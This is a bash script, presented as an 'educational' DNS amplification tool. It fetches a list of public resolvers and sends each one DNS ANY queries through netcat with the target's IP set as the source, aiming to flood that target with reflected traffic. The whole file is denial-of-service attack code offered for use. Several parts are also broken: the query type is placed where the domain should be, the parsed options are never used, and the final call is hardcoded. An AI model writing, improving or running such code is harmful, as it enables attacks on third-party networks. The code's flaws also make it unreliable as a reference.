#!bin/bash

###########################
# DNS Amplification Script
# Author: David Stromberger
# License: MIT
# Version: 1.0
# Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
###########################

function banner {
    echo -e "\e[38;5;208m===================================="
    echo -e "\e[38;5;208m   DNS Amplification Script Usage   "
    echo -e "\e[38;5;208m===================================="
    echo -e "\e[38;5;39mUsage: dns-bash <target_ip> [Options]"
    echo  ""
    echo -e "\e[38;5;39mOptions:"
    echo -e "\e[38;5;39m  -t <query_type>  Query type (default: ANY)"
    echo -e "\e[38;5;39m  -s <dns_server>  DNS server (default: 8.8.8.8)"
    echo -e "\e[38;5;39m  -p <port>        DNS server port (default: 53)"
    echo ""
    echo -e "\e[38;5;39mExample: dns-bash 192.168.1.100 -t ANY -s 1.1.1.1 -p 53"
}

function send_dns_query {
    local src_ip="$1"
    local port="$2"
    local query_type="$3"
    local resolver="$4"

    local txid=$(od -An -N2 -t x2 /dev/random)
    
    local packet=$(printf "\x${txid:0:2}\x${txid:2:2}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
    echo $packet
    local query=$(echo -n "$query_type" | sed 's/\./\\./g')
    local packet+=$(printf "\x${#query}\x${query}\x00\x00\x01\x00\x01")

    if ! command -v nc &> /dev/null; then
        echo "nc command not found"
        return 1
    fi
    
    if ! echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" > /dev/null; then
        echo "Failed to send DNS query"
        return 1
    fi

}

function amplify {
    local target_ip="$1"
    local port="$2"
    local query_type="$3"
    local resolver="$4"

    local dns_servers=$(read_dns_servers)

    for dns_server in $dns_servers; do
        echo -e "\e[38;5;208mSending DNS query to $dns_server"
        send_dns_query $target_ip $port $query_type $dns_server
    done
}

function get_public_dns_servers {
    source .env
    TMP_FILE=$(mktemp)

    curl -s $DNS_SERVER_LIST_URL > $TMP_FILE
    DNS_SERVERS=$(cat $TMP_FILE | grep -v '#' | awk '{print $1}')

    echo $DNS_SERVERS > $DNS_SERVER_LIST_FILE
    rm $TMP_FILE
}

function read_dns_servers {
    DNS_SERVERS=$(cat $DNS_SERVER_LIST_FILE)
    echo $DNS_SERVERS
}

function main {
    if [ $# -eq 0 ]; then
        banner
        exit 1
    fi
    
    TARGET_IP="$1"
    shift

    QUERY_TYPE="ANY"
    DNS_SERVER=""
    PORT="53"

    while [[ $# -gt 0 ]]; do
        key="$1"
        case $key in
            -t|--query-type)
            QUERY_TYPE="$2"
            shift
            shift
            ;;
            -s|--dns-server)
            DNS_SERVER="$2"
            shift
            shift
            ;;
            -p|--port)
            PORT="$2"
            shift
            shift
            ;;
            *)
            echo "Unknown option: $1"
            exit 1
            ;;
        esac
    done

    get_public_dns_servers
}

get_public_dns_servers
amplify 127.0.0.1 53 ANY 8.8.8.8